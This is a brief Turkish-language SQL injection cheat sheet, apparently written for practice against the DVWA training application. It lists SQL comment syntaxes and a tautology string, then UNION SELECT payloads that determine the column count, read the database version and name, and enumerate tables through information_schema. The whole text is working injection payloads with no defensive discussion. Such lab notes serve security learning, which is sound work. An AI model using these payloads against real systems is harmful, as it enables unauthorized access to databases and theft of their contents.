# (diyez) Buraya açıklama gelecek... ya da

-- (iki çizgi) Buraya açıklama gelecek... ya da

/* fazla satırlı
   açıklamalar için
   bu kullanılabilir */
   
   a'='a

Veritabanındaki Kolon Sayısının Tespiti
1′ UNION SELECT 1,2 # 

Veritabanının Versiyon Bilgisi
1′ UNION SELECT version(),2 # 

Veritabanının İsim Bilgisi
1′ UNION SELECT database(),2 # 

Veritabanındaki Tabloların Belirlenmesi
1′ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = ‘dvwa’ #
